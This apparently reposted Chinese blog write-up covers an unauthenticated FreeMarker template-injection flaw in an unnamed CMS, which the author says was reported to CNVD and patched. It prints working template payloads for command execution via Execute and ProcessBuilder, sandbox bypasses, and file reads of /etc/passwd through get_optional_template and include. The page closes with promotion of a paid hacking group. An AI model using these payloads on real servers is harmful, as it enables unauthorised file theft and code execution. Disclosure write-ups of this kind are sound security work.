#  某CMS的通用漏洞挖掘过程 | 干货   
ShawnDing  渗透安全团队   2024-02-24 22:28  
  
前言  
  
本文所涉及的漏洞已提交CNVD且厂商已完成漏洞修复，请勿用于非授权测试！！！  
  
现在比较严格，目标名称均以某CMS指代，见谅。  
## 前言  
  
本来计划在cnvd公开这个小漏洞的时候就把这篇小作文写了，最近一忙给整忘了，现在补上。  
  
某次项目中遇到这个cms，进行了常规黑盒测试后没发现什么大问题，检查cms指纹发现是开源的，嘿嘿。  
## 开源和黑盒的差异  
  
开源cms系统与平时定制化开发的目标系统存在以下差异：  
  
1.开源系统渗透测试人员可以直接接触到源码  
  
源码意味着：配置文件透明、开源组件版本透明、可进行源代码审计、可搭建本地测试环境  
  
2.开源系统往往有丰富的文档支持  
  
开发文档里说不定就会有开发测试相关接口可以实现意想不到的功能。（ps：遇到过比较离谱的，无需登录直接获取session的接口）。  
  
3.负责任的开发者会更新已知漏洞信息，提示用户升级  
## 开始排查  
  
1.检查使用的组件版本  
  
是否存在已知漏洞组件，开发框架是否存在已公开漏洞。  
  
如：shiro、fastjson、thinkphp等。  
  
2.检查配置文件  
  
是否存在硬编码秘钥等敏感信息。  
  
是否固定部署路径。  
  
3.源代码审计  
  
使用源代码审计工具先过一遍，当然能独立进行源代码审计的师傅当我没说。  
  
4.检查开发文档  
  
特别注意平常不常用的或者黑盒测试不容易发现的接口，这些很容易在黑盒测试中被忽略或者根本抓不到相关过程包。  
  
如：初始化api、工具接口、系统状态检查接口等等。  
  
5.检查该CMS是否有已公开的安全漏洞  
  
可以大概分析系统是否已经被各位师傅们刷过副本，大概了解系统的安全性。  
  
对低版本漏洞进行复现，检查测试项目的版本是否存在该漏洞，有精力的话fofa一波，还有机会提交几个事件型。  
  
6.搭建测试环境  
  
可以在本地环境进行测试，再也不怕系统奔溃啦！  
  
收集运行过程中的调试、日志信息，在后续可能派上用场（如：结合文件读取漏洞获取日志中敏感信息）。  
## 发现“有趣”的api  
  
对各个部分进行检查之后在官方网站的开放java api在线测试部分，发现了一个名为“getTemplateResult”的api（不需要用户认证），这个名字可确实叫人浮想联翩呢！获取模板结果？什么模板？服务端渲染？  
  
仿佛已经看到rce在向我招手了，嘿嘿。  
  
果断结合文档、查找源码，开始分析：  
  
文档说明：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSE9Ir6PyOtvyBscfGk5gTbnBlCFESzhibV0Rx3eIB0PcQ7ica9nRGPEN76m77ezagDZwicAeE5W1PQ0w/640?wx_fmt=jpeg&from=appmsg&random=0.9134814048822231 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSE9Ir6PyOtvyBscfGk5gTbnen7uISib8asYvdPxEdiaxSpeNB0ROhVJic42DvwC76uJ8X8h9qkITGjAg/640?wx_fmt=jpeg&from=appmsg&random=0.5966925232047378 "")  
基本可以确定是一处Freemarker模板注入，再看看源码：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSE9Ir6PyOtvyBscfGk5gTbnNzrafMT0I6KibFzmz0M8tg6CMNUZGHlhDMuFzmicFWGpGk0DUuN0KFicg/640?wx_fmt=jpeg&from=appmsg&random=0.49292445888802106 "")  
确认是无需认证的freemarker模板渲染。  
## 第一回合：尝试利用  
  
确认了freemarker组件，但是对freemarker的模板注入和沙盒绕过机制完全陌生......  
  
这个时候就要感谢前辈们的分享精神了：（ps：这一段完全是搬运工）  
  
参考：FreeMarker模板注入实现远程命令执行--Eleven  
  
参考：Freemarker模板注入 Bypass  
  
freemark中存在诸多“实用”的工具组件和内置函数：  
  
FreeMarker高级内置函数  
  
参考：https://freemarker.apache.org/docs/ref_builtins_expert.html  
### new函数利用  
  
其中， new函数创建一个继承 freemarker.template.TemplateModel 类的变量。  
  
利用方法一：  
  
freemarker.template.utility里面有个Execute类，这个类会执行它的参数，因此我们可以利用new函数新建一个Execute类，传输我们要执行的命令作为参数，从而构造远程命令执行漏洞。  
  
payload：  
```
<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}
```  
  
利用方法二：  
  
freemarker.template.utility里面有个ObjectConstructor类，这个类会把它的参数作为名称，构造了一个实例化对象。因此我们可以构造一个可执行命令的对象，从而构造远程命令执行漏洞。  
  
payload：  
```
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc.exe").start()}
```  
  
利用方法三：  
  
freemarker.template.utility里面的JythonRuntime，可以通过自定义标签的方式，执行Python命令，从而构造远程命令执行漏洞。  
  
payload：  
```
<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc.exe")</@value>
```  
  
霍霍，信心满满地开始尝试，然而：  
  
freemarker.template.utility.Execute is not allowed in the template for security reasons  
  
目标对可能造成rce的危险对象做了比较全面的安全限制（高版本freemarker安全配置）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSE9Ir6PyOtvyBscfGk5gTbn4P0uL33aQ1ZxOQOT4VMicj2QNnGDYCyYLRFfLAoY5kxvyrBH4VZNTVQ/640?wx_fmt=jpeg&from=appmsg&random=0.5314931194280275 "")  
另外两个方式也是相同结果，不再附图。  
### api函数利用  
  
Freemarker支持一个内置函数：?api，通过它可以访问底层Java Api Freemarker的 BeanWrappers 。可以尝试通过 Class.getResource 的返回值来访问对象 URI ，该对象包含方法 toURL 。因为URI提供静态方法 create ，通过该方法可以创建任意 URI ，然后用 toURL 将其返回至 URI ，可以尝试窃取系统的任意文件。  
  
payload：  
```
<#assign uri=object?api.class.getResource("/").toURI()> 
<#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()> 
<#assign is=input?api.getInputStream()> FILE:[<#list 0..999999999 as _> 
<#assign byte=is.read()> 
<#if byte == -1> 
<#break> 
</#if> 
${byte}, 
</#list>]
```  
  
进一步配合ProtectionDomain来获取ClassLoader加载引用任意类（即 Class<?> 对象）在源码中搜索可以加载并且有静态字段的类即包含public static final字段的类（以GSON为例）使用Freemarker自带的模板模型 Execute ，可以无需使用内置的 ?new 来实例化  
  
payload：  
```
<#assign classLoader=object?api.class.protectionDomain.classLoader> 
<#assign clazz=classLoader.loadClass("ClassExposingGSON")> 
<#assign field=clazz?api.getField("GSON")> 
<#assign gson=field?api.get(null)> 
<#assign ex=gson?api.fromJson("{}", classLoader.loadClass("freemarker.template.utility.Execute"))> 
${ex("id")}
```  
  
再次尝试，然而：Can't use ?api, because the \"api_builtin_enabled\" configuration setting is false.  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSE9Ir6PyOtvyBscfGk5gTbnCeJhSwo1wKNuEF5Bwlicgg3o5KznpJdzaPNIw8gU2zpiaaW7bd7brticA/640?wx_fmt=jpeg&from=appmsg&random=0.809880521809742 "")  
抬走抬走！  
  
第一回合，蓝方赢！  
## 第二回合  
  
既然使用freemarker实例化可执行对象的路子走不通了，那就只能从freemarker的内置变量及标签再检查是否有可以利用的地方了。  
  
参考材料：freemarker用户手册  
### get_optional_template变量  
  
发现了特殊变量：get_optional_template  
  
用于判断模板文件是否存在及进行后续加载  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSE9Ir6PyOtvyBscfGk5gTbnQLtBxicymjHPticxxT2Diavf6T8J0NRlqhQvmWSFX8naiaPovl8L1sFl2w/640?wx_fmt=png&from=appmsg&random=0.027016908718093813 "")  
  
考虑能否实现任意文件读取，payload：  
```
<#assign optTemp = .get_optional_template('/etc/passwd')>
<#if optTemp.exists>
  Template was found:
  <@optTemp.include />
<#else>
  Template was missing.
</#if>
```  
  
执行结果：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSE9Ir6PyOtvyBscfGk5gTbngdZ1OPXbIbic1GAX20qaue1htDAcNUzsLhLt3KFM1CiaVssKLSH7yzyg/640?wx_fmt=png&from=appmsg&random=0.3865240417901068 "")  
  
一个中危应该是保住了，嘿嘿。  
### include标签  
  
特殊标签法也能实现文件读取效果：  
  
include标签看到就知道是什么意思了吧，payload：  
```
<#include "/etc/passwd" parse=false>
```  
  
测试结果：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSE9Ir6PyOtvyBscfGk5gTbngJgUy4khQ4P6dnledPcrbyI4hy2D7W3UEGoIuzp8aZ214FmSZ94niag/640?wx_fmt=png&from=appmsg&random=0.021466777382123325 "")  
### setting标签  
  
另一个比较有意思的标签：setting标签  
  
先看看使用示例：  
```
<#setting locale="it_IT">
<#setting number_format="0.####">
```  
###   
  
值得注意的是该标签是可以影响到configuration/settings的。  
  
这不得不让人生出一丝丝联想：如果可以修改到configuration中的安全配置是不是意味着，就可以执行前边被限制的方法了呢？是不是很像当年的struts2绕过？  
  
先看看configurations做了哪些限制：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSE9Ir6PyOtvyBscfGk5gTbn4mprUydcEemx7GMiaweM0TII6PlwPDSydYiasaibUFglSZ5VxVwUVQknA/640?wx_fmt=jpeg&from=appmsg&random=0.22915777418584637 "")  
  
尝试使用setting标签修改APIBuiltinEnabled配置：  
  
payload：<#setting api_builtin_enabled=True >  
  
然而：The setting name is recognized, but changing this setting from inside a template isn't supported.  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSE9Ir6PyOtvyBscfGk5gTbnBBRB3wfgGQnqE2tXV9F9cZDlyP4RVcwHQuwvAmeDU8tujTia0qxhIBg/640?wx_fmt=png&from=appmsg&random=0.5450828308603808 "")  
  
好吧，是我想多了。  
  
第二回合，红方险胜。  
## 后续  
  
由于本人的java水平实在有限，以及对freemark组件确实不熟悉，另外项目时间也有限，测试过程先告一段落。接下来就是提交报告，另外大小算个通用，用的人还不少，zoomeye一波，写了POC脚本，也提交了cnvd。（ps：在写批量扫描脚本的时候发现不同版本的参数名还不同，文件读取也会受BASEDIR限制，只不过官方的docker镜像使用了根目录。很多坑确实要踩上去才会发现！）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSE9Ir6PyOtvyBscfGk5gTbn4c1jAjjdEYklb9rSUfJ8qicgHW99a2IUggJWzQib5iakWicFOIBaV81BVA/640?wx_fmt=png&from=appmsg&random=0.9882727031939651 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSE9Ir6PyOtvyBscfGk5gTbnNzJohx3VNEPLaOgwFxKHF8COgjXuWGGxsXmpU9sb1AD5fPTlSRFN3g/640?wx_fmt=png&from=appmsg&random=0.10293584185961624 "")  
如果大家有该漏洞更好的利用思路希望能一起沟通。感谢阅读，共同进步！  
```
文章来源:https://www.freebuf.com/articles/web/287319.html
文章作者：ShawnDing
```  
  
  
**★**  
  
**付费圈子**  
  
  
**欢 迎 加 入 星 球 ！**  
  
**代码审计+免杀+渗透学习资源+各种资料文档+各种工具+付费会员**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.4447566002908574&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**进成员内部群**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pPVXCo8Wd8AQHAyOTgM5sLrvP6qiboXljGWG0uOdvcNR8Qw5QJLxSVrbFds2j7MxExOz1ozb9ZoYwR68leoLdAg/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.09738205945672873&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**星球的最近主题和星球内部工具一些展示******  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pPVXCo8Wd8Doq0iczyRiaBfhTQyfzqSGuia4lfHfazabEKr2EDe7sGVoxUhLrNRA4FbI1yef6IkWdmzxvZrTiaJncg/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8BmE6FAA8Bq7H9GZIRt1xYZpmYNWxrrzolt71FtX5HyM03H0cxkiaYelv7ZSajLtibEdBXUpCibdItXw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8ADSxxicsBmvhX9yBIPibyJTWnDpqropKaIKtZQE3B9ZpgttJuibibCht1jXkNY7tUhLxJRdU6gibnrn0w/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DKZcqe8mOKY1OQN5yfOaD5MpGk0JkyWcDKZvqqTWL0YKO6fmC56kSpcKicxEjK0cCu8fG3mLFLeEg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DAc8LkYEjnluf7oQaBR9CR7oAqnjIIbLZqCxwQtBk833sLbiagicscEic0LSVfOnbianSv11PxzJdcicQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8B96heXWOIseicx7lYZcN8KRN8xTiaOibRiaHVP4weL4mxd0gyaWSuTIVJhBRdBmWXjibmcfes6qR1w49w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DAc8LkYEjnluf7oQaBR9CRBgpPoexbIY7eBAnR7sWS1BlBAQX51QhcOOOz06Ct2x1cMD25nA6mJQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8AqNwoQuOBy9yePOpO5Kr6aHIxj7d0ibfAuPx9fAempAoH9JfIgX4nKzCwDyhQzPrRIx4upyw5yT4Q/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
****  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.4447566002908574&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**加入安全交流群**  
  
  

								[                ](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489372&idx=1&sn=5e14ba5fa59059fb1ee405e56ef90d40&chksm=c175eaf3f60263e5ef5415a8a9fc134f0890fdb9c25ab956116d17109baf98b3bd6bed572a2d&scene=21#wechat_redirect)  

			                  
  
  
**关 注 有 礼**  
  
  
  
关注下方公众号回复“  
666  
”可以领取一套领取黑客成长秘籍  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
 还在等什么？赶紧点击下方名片关注学习吧！![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
**推荐阅读**  
  
  
  
[干货｜史上最全一句话木马](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489259&idx=1&sn=b268701409ad4e8785cd5ebc23176fc8&chksm=c175eb44f60262527120100bd353b3316948928bd7f44cf9b6a49f89d5ffafad88c6f1522226&scene=21#wechat_redirect)  
  
  
  
[干货 | CS绕过vultr特征检测修改算法](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247486980&idx=1&sn=6d65ae57f03bd32fddb37d7055e5ac8e&chksm=c175f3abf6027abdad06009b2fe964e79f2ca60701ae806b451c18845c656c12b9948670dcbc&scene=21#wechat_redirect)  
  
  
  
[实战 | 用中国人写的红队服务器搞一次内网穿透练习](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247488628&idx=1&sn=ff2c617cccc00fe262ed9610c790fe0e&chksm=c175e9dbf60260cd0e67439304c822d28d510f1e332867e78a07d631ab27143309d14e27e53f&scene=21#wechat_redirect)  
  
  
  
[实战 | 渗透某培训平台经历](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247488613&idx=1&sn=12884f3d196ac4f5c262a587590d516d&chksm=c175e9caf60260dcc0d5d81a560025d548c61fda975d02237d344fd79adc77ac592e7e562939&scene=21#wechat_redirect)  
  
  
  
[实战 | 一次曲折的钓鱼溯源反制](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489278&idx=1&sn=5347fdbf7bbeb3fd37865e191163763f&chksm=c175eb51f602624777fb84e7928bb4fa45c30f35e27f3d66fc563ed97fa3c16ff06d172b868c&scene=21#wechat_redirect)  
  
  
  
**免责声明**  
  
由于传播、利用本公众号渗透安全团队所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号渗透安全团队及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
好文分享收藏赞一下最美点在看哦  
  
